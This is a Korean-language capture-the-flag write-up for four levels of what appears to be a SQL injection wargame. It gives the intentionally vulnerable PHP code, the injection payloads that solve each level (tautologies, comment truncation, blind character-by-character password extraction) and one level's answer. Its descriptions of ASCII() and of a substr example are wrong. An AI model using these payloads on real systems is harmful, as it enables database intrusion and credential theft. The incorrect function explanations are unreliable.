# GREMLIN

## code
```php
<?php
    include "./config.php";
    login_chk();
    dbconnect();
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit>         ("No Hack ~_~"); // do not try to attack another table, database!
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysql_fetch_array(mysql_query($query));
    if($result['id']) solve("gremlin");
    highlight_file(__FILE__);
?>
```
## solution
위에 코드를 보게 되면 GET방식으로 id와 pw를 받고 있으며 id만 참이되면 문제가 풀리기 때문에 url뒤에
```
    ?id='or 1=1%23
```
이런 코드를 입력하게 되면 id가 참이 아니더라도 1=1이 참이 되고 %23이라는 #을 사용해서 뒤에오는 query문을 주석 처리를 하게 되므로 query문이 참이되게 되어서 문제를 깨게 된다.

-----------------------

# COBOLT

## code
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 확인을 하면 id와 pw를 get방식으로 받고 있다. 그리고 id가 admin이면 문제를 해결 할 수 있게 되므로 url뒤에
```
?id=admin'%23
```
위와 같은 코드를 입력하게 되면 id에는 admin이 들어가고, %23으로 주석처리를 해주기 때문에 '를 달아주고 주석처리를 해주게되면 id='admin'이므로 문제가 풀린다.

-------------

# GOBLIN

## code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 보게 되면 GET방식으로 no만 받고 있다. 그렇지만 id가 admin이여야 문제가 풀리게 되므로 url뒤에
```
?no=0 or 1=1 limit 1,1
```
위아 같은 코드를 입력하게 되면 no에는 0인 거짓값이 들어가지만 or 1=1로 참을 만든후 limit 1,1을 사용해서 db의 첫번째 줄에 있는 것을 꺼내왔다. 근데 마침 그 위치에 admin이 있어서 문제가 풀리게 되었다.

## limit
```mysql
limit a,b
```
는 a인덱스 부터 b개 만큼 출력을 하겠다는 것이다.

-----------------

# orc

## code 
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 보면 id는 admin으로 고정이 되어 있고 pw만 get방식으로 입력을 받고 있다. 그리고 코드를 보면 pw를 완전히 맞추어야 문제가 풀리는 것을 알 수 있다. 그래서 url뒤에
```
'or 1=1 and length(pw)=8#
```
이런 코드를 넣어 보게 되면 length라는 함수를 사용해서 pw의 길이를 알수 있게 된다. 그리고 이것이 참이였으므로 pw의 길이는 8자리라는 것을 알 수 있다. 다음으로 첫번째 자리의 값을 보려면
```
'or 1=1 and ascii(substr(pw,1,1))=50#
```
위와 같은 코드를 입력한다. substr에서 pw,1,1은 pw의 첫번째글자에서 한개라는 의미로 pw의 첫번째 자리를 뜻하다. 그럼 두번째 자리만 하려면
pw,2,1이와 같은 방법으로 모든 자리를 구해보면
ascii값으로는 50 57 53 100 53 56 52 52이므로
답은 pw=295d5844이다.

## length
length함수는 인자로 주어진 문자열의 길이를 구하는 것이다.

## ascii
문자열의 문자 값을 EBCDIC에서 ASCII 형식으로 변환 해주는 것이다.

## substr
```
substr(문자열, 시작index, 길이)
```
문자열에서 시작index부터 길이 만큼 잘라준다
```
ex) substr("Hello world!", 5, 5)
```
이러면 world가 추력이 된다.